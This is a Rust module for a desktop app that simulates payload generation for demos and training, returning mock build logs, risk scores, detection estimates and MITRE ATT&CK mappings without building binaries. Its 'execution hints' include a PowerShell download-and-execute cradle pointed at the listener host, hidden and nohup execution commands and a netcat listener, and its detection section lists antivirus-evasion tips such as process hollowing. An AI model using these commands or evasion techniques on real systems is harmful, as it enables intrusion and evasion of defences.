//! Simulated Payload Commands
//!
//! This module provides a SIMULATED payload generation system for demo/training purposes.
//! No actual executables are created - only JSON metadata and mock build logs.
//!
//! This is safe for:
//! - UI/UX demonstrations
//! - Training and education
//! - Feature development/testing

use serde::{Deserialize, Serialize};
use std::sync::Arc;
use parking_lot::RwLock;
use tauri::State;
use uuid::Uuid;
use chrono::{DateTime, Utc};

use crate::AppState;

/// Simulated payload configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadConfig {
    /// Payload type: reverse_tcp, reverse_https, bind_tcp, dns_txt
    pub payload_type: String,
    /// Listener host (for display only)
    pub lhost: String,
    /// Listener port (for display only)
    pub lport: u16,
    /// Target OS: windows, linux, macos, universal
    pub target_os: String,
    /// Output format: exe, dll, elf, macho, shellcode, powershell, python
    pub format: String,
    /// Architecture: x64, x86, arm64
    pub architecture: String,
    /// Enable obfuscation simulation
    pub obfuscation: bool,
    /// Enable signing simulation
    pub signing: bool,
    /// Enable staged delivery simulation
    pub staged: bool,
    /// Custom name for the payload
    pub name: Option<String>,
}

/// Simulated payload result - NO actual binary, just metadata
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SimulatedPayload {
    /// Unique payload ID
    pub id: String,
    /// Display name
    pub name: String,
    /// Configuration used
    pub config: PayloadConfig,
    /// Simulated file path (not real)
    pub simulated_path: String,
    /// Simulated file size
    pub simulated_size_bytes: u64,
    /// Simulated SHA256 hash (random)
    pub simulated_hash: String,
    /// Build timestamp
    pub created_at: DateTime<Utc>,
    /// Build log (simulated)
    pub build_log: Vec<BuildLogEntry>,
    /// Risk analysis
    pub risk_analysis: RiskAnalysis,
    /// Detection analysis (what AV might flag)
    pub detection_analysis: DetectionAnalysis,
    /// MITRE ATT&CK mapping
    pub mitre_mapping: Vec<MitreMapping>,
    /// Execution commands (for educational display)
    pub execution_hints: Vec<ExecutionHint>,
}

/// Build log entry
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildLogEntry {
    pub timestamp: DateTime<Utc>,
    pub level: String, // info, warn, success
    pub message: String,
}

/// Risk analysis for educational purposes
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RiskAnalysis {
    /// Overall risk score (0-100)
    pub risk_score: u8,
    /// Risk level: low, medium, high, critical
    pub risk_level: String,
    /// Individual risk factors
    pub factors: Vec<RiskFactor>,
    /// Recommendations
    pub recommendations: Vec<String>,
}

/// Individual risk factor
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RiskFactor {
    pub name: String,
    pub score: u8,
    pub description: String,
}

/// Detection analysis - what defenses might catch this
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionAnalysis {
    /// Estimated detection rate
    pub estimated_detection_rate: f32,
    /// AV products likely to detect
    pub likely_detectors: Vec<String>,
    /// Behavioral indicators
    pub behavioral_indicators: Vec<String>,
    /// Network indicators
    pub network_indicators: Vec<String>,
    /// Evasion recommendations
    pub evasion_notes: Vec<String>,
}

/// MITRE ATT&CK mapping
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MitreMapping {
    pub technique_id: String,
    pub technique_name: String,
    pub tactic: String,
    pub description: String,
}

/// Execution hint for educational display
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecutionHint {
    pub name: String,
    pub command: String,
    pub description: String,
    pub os: String,
}

/// Generate a simulated payload (no actual binary created)
#[tauri::command]
pub async fn generate_simulated_payload(
    config: PayloadConfig,
    _state: State<'_, Arc<RwLock<AppState>>>,
) -> Result<SimulatedPayload, String> {
    // Simulate build delay
    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

    let id = Uuid::new_v4().to_string();
    let name = config.name.clone().unwrap_or_else(|| {
        format!("payload_{}", &id[..8])
    });

    // Generate simulated build log
    let build_log = generate_build_log(&config);

    // Generate simulated values
    let simulated_size = calculate_simulated_size(&config);
    let simulated_hash = format!("{:064x}", rand::random::<u128>());
    let simulated_path = generate_simulated_path(&config, &name);

    // Generate risk analysis
    let risk_analysis = analyze_risk(&config);

    // Generate detection analysis
    let detection_analysis = analyze_detection(&config);

    // Generate MITRE mapping
    let mitre_mapping = map_mitre_techniques(&config);

    // Generate execution hints (educational)
    let execution_hints = generate_execution_hints(&config);

    Ok(SimulatedPayload {
        id,
        name,
        config,
        simulated_path,
        simulated_size_bytes: simulated_size,
        simulated_hash,
        created_at: Utc::now(),
        build_log,
        risk_analysis,
        detection_analysis,
        mitre_mapping,
        execution_hints,
    })
}

/// Get available payload types
#[tauri::command]
pub async fn get_payload_types() -> Result<Vec<PayloadTypeInfo>, String> {
    Ok(vec![
        PayloadTypeInfo {
            id: "reverse_tcp".into(),
            name: "Reverse TCP".into(),
            description: "Connects back to attacker on TCP port".into(),
            category: "Staged".into(),
            risk_level: "medium".into(),
        },
        PayloadTypeInfo {
            id: "reverse_https".into(),
            name: "Reverse HTTPS".into(),
            description: "Encrypted HTTPS callback to attacker".into(),
            category: "Staged".into(),
            risk_level: "low".into(),
        },
        PayloadTypeInfo {
            id: "bind_tcp".into(),
            name: "Bind TCP".into(),
            description: "Opens port on target for attacker connection".into(),
            category: "Stageless".into(),
            risk_level: "high".into(),
        },
        PayloadTypeInfo {
            id: "dns_txt".into(),
            name: "DNS TXT".into(),
            description: "Command and control over DNS TXT records".into(),
            category: "Covert".into(),
            risk_level: "low".into(),
        },
    ])
}

/// Payload type information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadTypeInfo {
    pub id: String,
    pub name: String,
    pub description: String,
    pub category: String,
    pub risk_level: String,
}

/// Get available output formats
#[tauri::command]
pub async fn get_payload_formats() -> Result<Vec<FormatInfo>, String> {
    Ok(vec![
        FormatInfo {
            id: "exe".into(),
            name: "Windows EXE".into(),
            extension: ".exe".into(),
            os: vec!["windows".into()],
            description: "Standalone Windows executable".into(),
        },
        FormatInfo {
            id: "dll".into(),
            name: "Windows DLL".into(),
            extension: ".dll".into(),
            os: vec!["windows".into()],
            description: "Dynamic link library for DLL injection".into(),
        },
        FormatInfo {
            id: "elf".into(),
            name: "Linux ELF".into(),
            extension: "".into(),
            os: vec!["linux".into()],
            description: "Linux executable binary".into(),
        },
        FormatInfo {
            id: "macho".into(),
            name: "macOS Mach-O".into(),
            extension: "".into(),
            os: vec!["macos".into()],
            description: "macOS executable binary".into(),
        },
        FormatInfo {
            id: "shellcode".into(),
            name: "Raw Shellcode".into(),
            extension: ".bin".into(),
            os: vec!["windows".into(), "linux".into(), "macos".into()],
            description: "Raw position-independent code".into(),
        },
        FormatInfo {
            id: "powershell".into(),
            name: "PowerShell".into(),
            extension: ".ps1".into(),
            os: vec!["windows".into()],
            description: "PowerShell script for fileless execution".into(),
        },
        FormatInfo {
            id: "python".into(),
            name: "Python".into(),
            extension: ".py".into(),
            os: vec!["windows".into(), "linux".into(), "macos".into()],
            description: "Cross-platform Python script".into(),
        },
    ])
}

/// Format information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FormatInfo {
    pub id: String,
    pub name: String,
    pub extension: String,
    pub os: Vec<String>,
    pub description: String,
}

// ============================================================================
// Helper functions for simulation
// ============================================================================

fn generate_build_log(config: &PayloadConfig) -> Vec<BuildLogEntry> {
    let now = Utc::now();
    let mut log = Vec::new();

    log.push(BuildLogEntry {
        timestamp: now,
        level: "info".into(),
        message: format!("[SIMULATION] Starting payload generation for {}", config.payload_type),
    });

    log.push(BuildLogEntry {
        timestamp: now + chrono::Duration::milliseconds(50),
        level: "info".into(),
        message: format!("Target: {} / {} / {}", config.target_os, config.architecture, config.format),
    });

    if config.obfuscation {
        log.push(BuildLogEntry {
            timestamp: now + chrono::Duration::milliseconds(100),
            level: "info".into(),
            message: "[SIMULATION] Applying obfuscation transforms...".into(),
        });
        log.push(BuildLogEntry {
            timestamp: now + chrono::Duration::milliseconds(200),
            level: "success".into(),
            message: "String encryption: enabled".into(),
        });
        log.push(BuildLogEntry {
            timestamp: now + chrono::Duration::milliseconds(250),
            level: "success".into(),
            message: "Control flow flattening: enabled".into(),
        });
    }

    if config.signing {
        log.push(BuildLogEntry {
            timestamp: now + chrono::Duration::milliseconds(300),
            level: "warn".into(),
            message: "[SIMULATION] Code signing requested (simulated certificate)".into(),
        });
    }

    if config.staged {
        log.push(BuildLogEntry {
            timestamp: now + chrono::Duration::milliseconds(350),
            level: "info".into(),
            message: "[SIMULATION] Generating staged payload (stager + stage)".into(),
        });
    }

    log.push(BuildLogEntry {
        timestamp: now + chrono::Duration::milliseconds(400),
        level: "success".into(),
        message: format!("[SIMULATION] Payload metadata generated: {}:{}", config.lhost, config.lport),
    });

    log.push(BuildLogEntry {
        timestamp: now + chrono::Duration::milliseconds(450),
        level: "success".into(),
        message: "[SIMULATION] Build complete (no actual binary created)".into(),
    });

    log
}

fn calculate_simulated_size(config: &PayloadConfig) -> u64 {
    let base_size: u64 = match config.format.as_str() {
        "exe" => 45_000,
        "dll" => 38_000,
        "elf" => 32_000,
        "macho" => 35_000,
        "shellcode" => 4_000,
        "powershell" => 8_000,
        "python" => 12_000,
        _ => 20_000,
    };

    let mut size = base_size;

    if config.obfuscation {
        size = (size as f64 * 1.3) as u64;
    }
    if config.staged {
        size = (size as f64 * 0.4) as u64; // Stager is smaller
    }

    // Add some randomness
    size + (rand::random::<u64>() % 5000)
}

fn generate_simulated_path(config: &PayloadConfig, name: &str) -> String {
    let ext = match config.format.as_str() {
        "exe" => ".exe",
        "dll" => ".dll",
        "elf" => "",
        "macho" => "",
        "shellcode" => ".bin",
        "powershell" => ".ps1",
        "python" => ".py",
        _ => ".bin",
    };

    format!("/simulated/payloads/{}{}", name, ext)
}

fn analyze_risk(config: &PayloadConfig) -> RiskAnalysis {
    let mut factors = Vec::new();
    let mut total_score = 0u16;

    // Format risk
    let format_score = match config.format.as_str() {
        "exe" | "dll" => 60,
        "elf" | "macho" => 50,
        "shellcode" => 70,
        "powershell" => 55,
        "python" => 40,
        _ => 50,
    };
    factors.push(RiskFactor {
        name: "Format Risk".into(),
        score: format_score,
        description: format!("{} format has moderate detection likelihood", config.format),
    });
    total_score += format_score as u16;

    // Payload type risk
    let type_score = match config.payload_type.as_str() {
        "reverse_tcp" => 50,
        "reverse_https" => 35,
        "bind_tcp" => 65,
        "dns_txt" => 25,
        _ => 50,
    };
    factors.push(RiskFactor {
        name: "Connection Type Risk".into(),
        score: type_score,
        description: format!("{} connection pattern analysis", config.payload_type),
    });
    total_score += type_score as u16;

    // Obfuscation benefit
    if config.obfuscation {
        factors.push(RiskFactor {
            name: "Obfuscation".into(),
            score: 20,
            description: "Obfuscation reduces signature detection".into(),
        });
    } else {
        factors.push(RiskFactor {
            name: "No Obfuscation".into(),
            score: 40,
            description: "Without obfuscation, signatures are easily detectable".into(),
        });
        total_score += 20;
    }

    let risk_score = (total_score / factors.len() as u16).min(100) as u8;
    let risk_level = match risk_score {
        0..=25 => "low",
        26..=50 => "medium",
        51..=75 => "high",
        _ => "critical",
    }.into();

    let recommendations = vec![
        "Use HTTPS callback for encrypted C2 traffic".into(),
        "Enable obfuscation to reduce static signatures".into(),
        "Consider DNS-based C2 for covert operations".into(),
        "Test in isolated environment before deployment".into(),
    ];

    RiskAnalysis {
        risk_score,
        risk_level,
        factors,
        recommendations,
    }
}

fn analyze_detection(config: &PayloadConfig) -> DetectionAnalysis {
    let detection_rate = if config.obfuscation { 0.35 } else { 0.65 };

    let likely_detectors = if config.obfuscation {
        vec![
            "Windows Defender (Behavioral)".into(),
            "CrowdStrike Falcon".into(),
            "Carbon Black".into(),
        ]
    } else {
        vec![
            "Windows Defender".into(),
            "Norton".into(),
            "McAfee".into(),
            "Kaspersky".into(),
            "ESET".into(),
        ]
    };

    let behavioral_indicators = vec![
        format!("Outbound connection to {}:{}", config.lhost, config.lport),
        "Process injection detected".into(),
        "Suspicious API call sequences".into(),
        "Memory-only execution pattern".into(),
    ];

    let network_indicators = vec![
        format!("C2 beacon interval: ~60 seconds"),
        format!("Protocol: {}", if config.payload_type.contains("https") { "HTTPS" } else { "TCP" }),
        "Jitter: 10-30%".into(),
    ];

    let evasion_notes = vec![
        "Consider process hollowing for AV bypass".into(),
        "Use legitimate parent process (explorer.exe)".into(),
        "Implement sleep obfuscation".into(),
        "Add legitimate network traffic mixing".into(),
    ];

    DetectionAnalysis {
        estimated_detection_rate: detection_rate,
        likely_detectors,
        behavioral_indicators,
        network_indicators,
        evasion_notes,
    }
}

fn map_mitre_techniques(config: &PayloadConfig) -> Vec<MitreMapping> {
    let mut mappings = vec![
        MitreMapping {
            technique_id: "T1059".into(),
            technique_name: "Command and Scripting Interpreter".into(),
            tactic: "Execution".into(),
            description: "Payload executes commands on target".into(),
        },
    ];

    match config.payload_type.as_str() {
        "reverse_tcp" | "reverse_https" => {
            mappings.push(MitreMapping {
                technique_id: "T1071".into(),
                technique_name: "Application Layer Protocol".into(),
                tactic: "Command and Control".into(),
                description: "Uses TCP/HTTPS for C2 communication".into(),
            });
        }
        "dns_txt" => {
            mappings.push(MitreMapping {
                technique_id: "T1071.004".into(),
                technique_name: "DNS".into(),
                tactic: "Command and Control".into(),
                description: "Uses DNS TXT records for C2".into(),
            });
        }
        _ => {}
    }

    if config.format == "powershell" {
        mappings.push(MitreMapping {
            technique_id: "T1059.001".into(),
            technique_name: "PowerShell".into(),
            tactic: "Execution".into(),
            description: "Uses PowerShell for execution".into(),
        });
    }

    if config.obfuscation {
        mappings.push(MitreMapping {
            technique_id: "T1027".into(),
            technique_name: "Obfuscated Files or Information".into(),
            tactic: "Defense Evasion".into(),
            description: "Payload is obfuscated to evade detection".into(),
        });
    }

    mappings
}

fn generate_execution_hints(config: &PayloadConfig) -> Vec<ExecutionHint> {
    let mut hints = Vec::new();

    match config.format.as_str() {
        "exe" => {
            hints.push(ExecutionHint {
                name: "Direct Execution".into(),
                command: format!(".\\payload.exe"),
                description: "Run directly from command line".into(),
                os: "windows".into(),
            });
            hints.push(ExecutionHint {
                name: "Background Execution".into(),
                command: format!("Start-Process -WindowStyle Hidden .\\payload.exe"),
                description: "Run hidden in background".into(),
                os: "windows".into(),
            });
        }
        "powershell" => {
            hints.push(ExecutionHint {
                name: "IEX Download Cradle".into(),
                command: format!("IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')", config.lhost, config.lport),
                description: "Download and execute in memory".into(),
                os: "windows".into(),
            });
            hints.push(ExecutionHint {
                name: "Encoded Command".into(),
                command: "powershell -enc <base64>".into(),
                description: "Execute Base64-encoded payload".into(),
                os: "windows".into(),
            });
        }
        "elf" => {
            hints.push(ExecutionHint {
                name: "Direct Execution".into(),
                command: "chmod +x payload && ./payload".into(),
                description: "Make executable and run".into(),
                os: "linux".into(),
            });
            hints.push(ExecutionHint {
                name: "Background with nohup".into(),
                command: "nohup ./payload &".into(),
                description: "Run in background, persist after logout".into(),
                os: "linux".into(),
            });
        }
        "python" => {
            hints.push(ExecutionHint {
                name: "Python3 Execution".into(),
                command: "python3 payload.py".into(),
                description: "Execute with Python 3".into(),
                os: "universal".into(),
            });
        }
        _ => {}
    }

    // Listener hints
    hints.push(ExecutionHint {
        name: "Netcat Listener".into(),
        command: format!("nc -lvnp {}", config.lport),
        description: "Simple netcat listener for testing".into(),
        os: "universal".into(),
    });

    hints
}
